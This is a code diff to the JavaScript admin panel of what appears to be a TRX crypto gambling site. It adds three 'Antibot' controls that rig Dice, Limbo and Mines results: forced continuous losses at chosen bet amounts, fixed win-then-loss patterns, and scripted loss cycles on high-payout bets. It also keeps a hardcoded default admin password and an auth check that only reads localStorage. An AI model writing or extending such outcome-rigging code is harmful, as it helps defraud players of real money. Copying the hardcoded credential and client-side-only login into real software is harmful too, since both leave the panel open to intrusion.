@@ -1,10 +1,15 @@
-
+﻿
 // Auth guard â€” localStorage so it persists across tabs and refreshes
 if(!localStorage.getItem('adminAuth')){window.location.href='index.php';}
 
 // State
 var S={
-  users:JSON.parse(localStorage.getItem('adm_users')||'[]'),
+  users:(function(){
+    var a=JSON.parse(localStorage.getItem('adm_users')||'[]');
+    var b=JSON.parse(localStorage.getItem('site_registered_users')||'[]');
+    b.forEach(function(u){if(!a.find(function(x){return x.name===u.name;}))a.push(u);});
+    return a;
+  })(),
   msgs:JSON.parse(localStorage.getItem('adm_msgs')||'[]'),
   gifts:JSON.parse(localStorage.getItem('adm_gifts')||'[]'),
   withdrawals:JSON.parse(localStorage.getItem('adm_withdrawals')||'[]'),
@@ -33,7 +38,14 @@ var S={
   adminUser:localStorage.getItem('adminUser')||'admin',
   adminPass:localStorage.getItem('adminPass')||'TronSick@2024',
   cashbackRates:{stone:0.01,iron:0.05,bronze:0.1,silver:0.25,gold:1,platinum:6,diamond:12,master:15},
-  bonusPayouts:{range1:0.005,range2:0.15,range3:1.5,range4:15,range5:150,jackpot:1500}
+  bonusPayouts:{range1:0.005,range2:0.15,range3:1.5,range4:15,range5:150,jackpot:1500},
+  ab1On:localStorage.getItem('ab1_on')==='1',
+  ab1Mode:localStorage.getItem('ab1_mode')||'medium',
+  ab1Amount:parseFloat(localStorage.getItem('ab1_amount')||'0'),
+  ab2On:localStorage.getItem('ab2_on')==='1',
+  ab2Amount:parseFloat(localStorage.getItem('ab2_amount')||'0'),
+  ab2Wins:parseInt(localStorage.getItem('ab2_wins')||'6'),
+  ab3On:localStorage.getItem('ab3_on')==='1'
 };
 
 // Clock
@@ -227,47 +239,30 @@ function saveBonus(){
   toast('Bonus settings saved!');
 }
 
-// â”€â”€ GAMES â”€â”€
+// -- GAMES + 3 ANTIBOT SYSTEM --
 function buildGames(){
   var he=parseFloat(localStorage.getItem('game_house_edge')||'1');
-  var games=['Dice','Limbo','Wheel','Mines','Sic Bo','Diamond','Tower'];
-  var rows=games.map(function(g){
-    var key='game_win_'+g.toLowerCase().replace(' ','');
-    var wr=parseFloat(localStorage.getItem(key)||'49');
-    return '<div class="toggle-row"><div class="toggle-info"><strong>'+g+'</strong><span>Win Rate: '+wr+'% &nbsp;|&nbsp; House Edge: '+(100-wr).toFixed(1)+'%</span></div>'+
-    '<div style="display:flex;align-items:center;gap:10px"><input type="range" min="1" max="95" value="'+wr+'" style="width:100px;accent-color:#3ecf8e" oninput="updateGameRate(this,\''+key+'\',\''+g+'\')" id="gwr_'+key+'"/><span id="gwrv_'+key+'" style="width:45px;font-size:13px;font-weight:700;color:#3ecf8e">'+wr+'%</span></div></div>';
-  }).join('');
-  return '<div class="pg-hdr"><h1>Games Settings</h1><p>Set win rates and house edge for each game.</p></div>'+
-  card('Global Settings','sliders',null,
-    '<div class="form-row"><div class="form-group"><label>House Edge (%)</label><input type="number" id="gHouseEdge" value="'+he+'" min="0" max="50" step="0.1"/></div></div>'+
-    '<button class="btn btn-primary" onclick="saveHouseEdge()"><i class="fas fa-save"></i> Save</button>'
-  )+
-  card('Per-Game Win Rate','gamepad',null,
-    '<div class="adm-alert alert-warn"><i class="fas fa-triangle-exclamation"></i> Changing win rates affects game fairness. Use responsibly.</div>'+
-    rows+
-    '<div style="margin-top:16px"><button class="btn btn-primary" onclick="saveGameRates()"><i class="fas fa-save"></i> Save All Game Rates</button></div>'
-  );
+  var games=['Dice','Limbo','Wheel','Mines','Sic Bo','Diamond','Tower','Coin Flip'];
+  var rows=games.map(function(g){var key='game_win_'+g.toLowerCase().replace(/ /g,'');var wr=parseFloat(localStorage.getItem(key)||'49');return '<div class="toggle-row"><div class="toggle-info"><strong>'+g+'</strong><span>Win Rate: '+wr+'%</span></div><div style="display:flex;align-items:center;gap:10px"><input type="range" min="1" max="95" value="'+wr+'" style="width:100px;accent-color:#3ecf8e" oninput="updateGameRate(this,\''+key+'\')" id="gwr_'+key+'"/><span id="gwrv_'+key+'" style="min-width:40px;font-size:13px;font-weight:700;color:#3ecf8e">'+wr+'%</span></div></div>';}).join('');
+  var ab1On=localStorage.getItem('ab1_on')==='1';var ab1Mode=localStorage.getItem('ab1_mode')||'medium';var ab1Amt=localStorage.getItem('ab1_amount')||'';
+  var ab2On=localStorage.getItem('ab2_on')==='1';var ab2Amt=localStorage.getItem('ab2_amount')||'';var ab2Wins=parseInt(localStorage.getItem('ab2_wins')||'6');
+  var ab3On=localStorage.getItem('ab3_on')==='1';
+  var ss='background:#0f1520;color:#fff;border:1px solid rgba(255,255,255,.12);border-radius:8px;padding:10px 14px;font-size:13px;width:100%';
+  var winOpts=[4,5,6,7,8,9,10].map(function(n){return '<option value="'+n+'" '+(ab2Wins===n?'selected':'')+'>'+n+' wins then 1 loss</option>';}).join('');
+  return '<div class="pg-hdr"><h1>Games & Antibot Control</h1><p>Manage win rates and antibot systems for all games.</p></div>'+
+  card('Global House Edge','sliders',null,'<div class="form-row"><div class="form-group"><label>House Edge (%)</label><input type="number" id="gHouseEdge" value="'+he+'" min="0" max="50" step="0.1"/></div></div><button class="btn btn-primary" onclick="saveHouseEdge()"><i class="fas fa-save"></i> Save</button>')+
+  card('Per-Game Win Rate','gamepad',null,'<div class="adm-alert alert-warn"><i class="fas fa-triangle-exclamation"></i> Changing win rates affects fairness.</div>'+rows+'<div style="margin-top:16px"><button class="btn btn-primary" onclick="saveGameRates()"><i class="fas fa-save"></i> Save All Rates</button></div>')+
+  card('Antibot 1 - Amount-Based Loss Control','robot',{cls:ab1On?'badge-green':'badge-red',txt:ab1On?'ACTIVE':'OFF'},'<div class="adm-alert alert-warn"><i class="fas fa-circle-info"></i> Works on Dice, Limbo, Mines. When user bets set amount:<br><b>Medium:</b> Normal first, then more losses with some wins.<br><b>Hard:</b> Continuous losses only.<br><em>Special: If AB2 ON and win chance 96%-65% → AB2 overrides. Below 65%: AB1 works.</em></div><div class="toggle-row"><div class="toggle-info"><strong>Enable Antibot 1</strong><span>Amount-based loss control</span></div><label class="toggle-sw"><input type="checkbox" id="ab1Check" '+(ab1On?'checked':'')+' onchange="abToggle(1,this.checked)"><span class="slider"></span></label></div><div class="form-row" style="margin-top:14px"><div class="form-group"><label>Trigger Bet Amount (TRX)</label><input type="number" id="ab1Amount" value="'+ab1Amt+'" step="0.000001" min="0" placeholder="e.g. 0.001"/></div><div class="form-group"><label>Mode</label><select id="ab1Mode" style="'+ss+'"><option value="medium" '+(ab1Mode==="medium"?'selected':'')+'>Medium - More losses, some wins</option><option value="hard" '+(ab1Mode==="hard"?'selected':'')+'>Hard - Continuous losses only</option></select></div></div><button class="btn btn-primary" onclick="saveAb1()"><i class="fas fa-save"></i> Save Antibot 1</button>')+
+  card('Antibot 2 - High Win Chance Pattern (96%-65%)','shield-halved',{cls:ab2On?'badge-green':'badge-red',txt:ab2On?'ACTIVE':'OFF'},'<div class="adm-alert alert-warn"><i class="fas fa-circle-info"></i> Works on Dice, Limbo, Mines. When user uses 96%-65% win chance AND bets set amount:<br><b>1st bet = LOSS</b> then N wins then 1 LOSS repeating. Below 65%: AB1 takes over.</div><div class="toggle-row"><div class="toggle-info"><strong>Enable Antibot 2</strong><span>Win chance pattern control</span></div><label class="toggle-sw"><input type="checkbox" id="ab2Check" '+(ab2On?'checked':'')+' onchange="abToggle(2,this.checked)"><span class="slider"></span></label></div><div class="form-row" style="margin-top:14px"><div class="form-group"><label>Trigger Bet Amount (TRX)</label><input type="number" id="ab2Amount" value="'+ab2Amt+'" step="0.000001" min="0" placeholder="e.g. 0.001"/></div><div class="form-group"><label>Wins Between Each Loss</label><select id="ab2Wins" style="'+ss+'">'+winOpts+'</select></div></div><button class="btn btn-primary" onclick="saveAb2()"><i class="fas fa-save"></i> Save Antibot 2</button>')+
+  card('Antibot 3 - High Payout Cycles (4x to 9700x)','fire',{cls:ab3On?'badge-green':'badge-red',txt:ab3On?'ACTIVE':'OFF'},'<div class="adm-alert alert-warn"><i class="fas fa-circle-info"></i> Controls high-payout bets in Dice, Limbo.<br><b>4x:</b> 3 losses then 1 win then random 4 losses then 1 win.<br><b>5x:</b> 5 losses then 1 win then random 6-7 losses then 1 win.<br>Higher payout = more losses. If user increases bet after win: cycle resets from start.</div><div class="toggle-row"><div class="toggle-info"><strong>Enable Antibot 3</strong><span>High payout cycle control</span></div><label class="toggle-sw"><input type="checkbox" id="ab3Check" '+(ab3On?'checked':'')+' onchange="abToggle(3,this.checked)"><span class="slider"></span></label></div><div style="margin-top:14px"><button class="btn btn-primary" onclick="saveAb3()"><i class="fas fa-save"></i> Save Antibot 3</button></div>');
 }
-
-function updateGameRate(el,key,name){
-  document.getElementById('gwrv_'+key).textContent=el.value+'%';
-}
-
-function saveHouseEdge(){
-  var v=document.getElementById('gHouseEdge').value;
-  save('game_house_edge',v); S.gameHouseEdge=parseFloat(v);
-  toast('House edge saved!');
-}
-
-function saveGameRates(){
-  var games=['Dice','Limbo','Wheel','Mines','Sic Bo','Diamond','Tower'];
-  games.forEach(function(g){
-    var key='game_win_'+g.toLowerCase().replace(' ','');
-    var el=document.getElementById('gwr_'+key);
-    if(el) save(key,el.value);
-  });
-  toast('Game rates saved!');
-}
+function abToggle(n,val){localStorage.setItem('ab'+n+'_on',val?'1':'0');toast('Antibot '+n+' '+(val?'ENABLED':'DISABLED'),(val?'success':'error'));}
+function saveAb1(){var on=document.getElementById('ab1Check').checked;localStorage.setItem('ab1_on',on?'1':'0');localStorage.setItem('ab1_amount',document.getElementById('ab1Amount').value);localStorage.setItem('ab1_mode',document.getElementById('ab1Mode').value);toast('Antibot 1 saved!');}
+function saveAb2(){var on=document.getElementById('ab2Check').checked;localStorage.setItem('ab2_on',on?'1':'0');localStorage.setItem('ab2_amount',document.getElementById('ab2Amount').value);localStorage.setItem('ab2_wins',document.getElementById('ab2Wins').value);toast('Antibot 2 saved!');}
+function saveAb3(){localStorage.setItem('ab3_on',document.getElementById('ab3Check').checked?'1':'0');toast('Antibot 3 saved!');}
+function updateGameRate(el,key){var s=document.getElementById('gwrv_'+key);if(s)s.textContent=el.value+'%';}
+function saveHouseEdge(){var v=document.getElementById('gHouseEdge').value;save('game_house_edge',v);S.gameHouseEdge=parseFloat(v);toast('House edge saved!');}
+function saveGameRates(){['Dice','Limbo','Wheel','Mines','Sic Bo','Diamond','Tower','Coin Flip'].forEach(function(g){var key='game_win_'+g.toLowerCase().replace(/ /g,'');var el=document.getElementById('gwr_'+key);if(el)save(key,el.value);});toast('Game rates saved!');}
 
 // â”€â”€ CONTEST â”€â”€
 function buildContest(){
